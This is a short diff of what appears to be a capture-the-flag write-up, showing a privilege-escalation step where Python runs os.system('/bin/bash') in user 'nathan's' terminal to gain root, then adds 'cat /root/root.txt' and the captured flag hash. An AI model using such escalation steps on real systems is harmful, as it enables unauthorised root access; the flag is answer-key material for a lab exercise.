@@ -98,4 +98,7 @@ os.system("/bin/bash")
 
 using python3 in nathans terminal and using above code gives us root access. 
 
+```
+cat /root/root.txt
+***18d7097c5114ee547e92d3382444091c***
 
